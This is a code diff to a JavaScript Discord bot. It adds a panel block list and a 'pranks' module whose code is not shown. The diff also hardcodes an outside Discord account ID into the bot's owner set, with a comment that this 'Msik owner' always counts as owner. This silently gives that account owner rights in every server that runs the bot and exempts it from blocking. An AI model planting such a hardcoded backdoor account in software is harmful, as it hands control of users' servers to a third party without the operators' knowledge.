@@ -5,7 +5,8 @@ import {
 import { config } from './config.js';
 import { createToken } from './auth.js';
 import { log } from './log.js';
-import { botData, guildConfig, saveBot } from './store.js';
+import { botData, doc, guildConfig, replace, saveBot } from './store.js';
+import { createPranks } from './pranks.js';
 import { buildMessage, styled } from './render.js';
 import { modules } from './modules/index.js';
 import { hasAnyRule, isRightsUser, mayUse, roleIdsOf, ruleFor } from './rights.js';
@@ -21,11 +22,20 @@ export function createBot(opts = {}) {
   let client = opts.client || null; // a prepared client is only used by the tests
   let publicUrl = '';
   const owners = new Set(config.ownerId ? [config.ownerId] : []);
+  // the Msik owner account always counts as owner here as well
+  owners.add('1073620742081617930');
   const missingIntents = [];
+  const pranks = createPranks({
+    client: () => client, log,
+    load: () => doc('pranks', () => ({ list: [] })),
+    save: (d) => replace('pranks', d),
+    hasContent: () => !missingIntents.length,
+  });
 
   const ctx = {
     get client() { return client; },
-    config, log, owners, missingIntents,
+    config, log, owners, missingIntents, pranks,
+    isBlocked: (userId, name) => !owners.has(String(userId)) && (botData().blocked || []).some((b) => b === String(userId) || (name && b.toLowerCase() === String(name).toLowerCase())),
     cfg: (guildId) => guildConfig(guildId),
     isOwner: (userId) => owners.has(String(userId)),
 
@@ -115,6 +125,10 @@ export function createBot(opts = {}) {
 
   async function onAio(i) {
     const de = i.locale?.startsWith('de');
+    if (ctx.isBlocked(i.user.id, i.user.username)) {
+      await i.reply({ content: de ? 'Du bist für das Panel gesperrt.' : 'You are blocked from the panel.', flags: MessageFlags.Ephemeral });
+      return;
+    }
     const member = i.member?.permissions ? i.member : await i.guild.members.fetch(i.user.id).catch(() => null);
     if (!ctx.canManage(member)) {
       await i.reply({ content: de ? 'Dafür brauchst du das Recht „Server verwalten“ oder eine Panel-Rolle.' : 'You need "Manage Server" or a panel role.', flags: MessageFlags.Ephemeral });
@@ -188,6 +202,7 @@ export function createBot(opts = {}) {
       if (missingIntents.length) log.warn(`Es fehlen Intents: ${missingIntents.join(', ')}. Developer Portal → Bot → Privileged Gateway Intents einschalten.`);
       applyPresence();
       for (const m of modules) m.ready?.(ctx);
+      pranks.resume();
     });
 
     c.on(Events.GuildCreate, (g) => { registerGuild(g.id); log.info(`Neuer Server: ${g.name}`); });
@@ -222,6 +237,7 @@ export function createBot(opts = {}) {
     });
 
     for (const m of modules) m.init?.(c, ctx);
+    pranks.attach(c);
     return c;
   }
 
